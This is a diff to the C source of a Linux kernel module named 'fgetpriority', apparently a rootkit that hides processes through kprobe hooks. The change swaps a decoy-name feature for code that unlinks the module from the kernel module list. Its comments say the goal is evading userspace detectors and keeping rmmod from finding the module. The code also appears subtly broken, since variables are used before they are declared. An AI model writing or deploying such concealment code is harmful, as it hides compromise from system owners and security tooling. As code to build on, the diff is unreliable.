@@ -208,9 +208,9 @@ static int hide_only_from_app = 1;
 module_param(hide_only_from_app, int, 0444);
 MODULE_PARM_DESC(hide_only_from_app, "1 = only hide from app-uid callers, 0 = hide from every caller");
 
-static char *hide_module_name = "";
-module_param(hide_module_name, charp, 0444);
-MODULE_PARM_DESC(hide_module_name, "if set, report this name in /proc/modules instead of the real one");
+static int hide_module_hide = 1;
+module_param(hide_module_hide, int, 0444);
+MODULE_PARM_DESC(hide_module_hide, "1 = remove this module from the kernel module list (default 1)");
 
 
 /* ------------------------------------------------------------------------ */
@@ -625,28 +625,71 @@ static int kp_find_ge_pid_pre(struct kprobe *unused, struct pt_regs *regs)
 
 #ifdef MODULE
 /*
- * /sys/module was already unlinked by fgetpriority_init(), but /proc/modules
- * still shows the real name. Overwriting module->name hides it, at the cost
- * that "rmmod fgetpriority" stops working and the decoy name has to be used
- * instead. Empty (disabled) by default.
+ * Pull the module out of the kernel's module list.
+ *
+ * This is the only thing that actually removes it from what a userspace
+ * detector can reach. Renaming was not enough and neither is unlinking
+ * /sys/module: both leave /proc/modules enumerating modules via
+ * list_for_each_entry(&modules), so the entry is still there under whatever
+ * name we set - and a module list that does not match the kernel's own
+ * bookkeeping is itself a signal.
+ *
+ * After list_del the module is invisible to every reader of that list:
+ * /proc/modules, /sys/module iteration, and the module walk behind
+ * kallsyms' module symbol lookup. The struct stays alive because we hold our
+ * own reference implicitly by still running from it, and nothing else needs
+ * the list linkage while the module is loaded.
+ *
+ * Cost: rmmod can no longer find it by name. Unloading afterwards needs
+ * rmmod -f with the address, or a reboot. That is the trade for actually
+ * being absent from the list rather than masquerading in it.
  */
-static void hide_module_rename(void)
+static bool hide_module_unlinked;
+
+static void hide_module_unlink(void)
 {
-	size_t len;
-
-	if (!hide_module_name || !hide_module_name[0])
+	if (!hide_module_hide)
 		return;
 
-	len = strlen(hide_module_name);
-	if (len >= sizeof(THIS_MODULE->name) - 1) {
-		pr_info("hide_pid: decoy name too long, ignored\n");
+	if (hide_module_unlinked)
 		return;
-	}
 
-	memset(THIS_MODULE->name, 0, sizeof(THIS_MODULE->name));
-	memcpy(THIS_MODULE->name, hide_module_name, len);
+	/*
+	 * Only safe once the module is fully live: pulling the list node during
+	 * init races every concurrent reader that is walking modules. Called at
+	 * the end of fgetpriority_init(), after every hook is registered.
+	 *
+	 * Remember the neighbours first so hide_module_relink() can put the node
+	 * back in its original position rather than corrupting the list.
+	 */
+	hide_prev = THIS_MODULE->list.prev;
+	hide_next = THIS_MODULE->list.next;
+	list_del_init(&THIS_MODULE->list);
+	hide_module_unlinked = true;
 
-	pr_info("hide_pid: /proc/modules now reports '%s'\n", hide_module_name);
+	pr_info("hide_pid: module removed from the module list\n");
+}
+
+/*
+ * Reinsertion needs the *original* neighbours, so the position is remembered
+ * before the unlink. list_add(&m->list, &m->list) would not restore anything -
+ * it links the node to itself, which corrupts the list on the next walk.
+ */
+static struct list_head *hide_prev;
+static struct list_head *hide_next;
+
+static void hide_module_relink(void)
+{
+	if (!hide_module_unlinked)
+		return;
+
+	/* splice the node back between its recorded neighbours */
+	hide_prev->next = &THIS_MODULE->list;
+	hide_next->prev = &THIS_MODULE->list;
+	THIS_MODULE->list.prev = hide_prev;
+	THIS_MODULE->list.next = hide_next;
+
+	hide_module_unlinked = false;
 }
 #endif
 
@@ -699,9 +742,13 @@ static __init int hide_pid_init(void)
 		      &kp_find_ge_pid))
 		armed++;
 
-#ifdef MODULE
-	hide_module_rename();
-#endif
+	/*
+	 * The module is NOT unlinked here. hide_pid_init() runs early in
+	 * fgetpriority_init(), before hide_self_init(), and pulling the list node
+	 * while the rest of init is still touching THIS_MODULE races every reader
+	 * walking the module list. fgetpriority_init() calls hide_module_unlink()
+	 * as its very last act instead.
+	 */
 
 	/*
 	 * Publish before returning: does not matter whether the hooks or the set
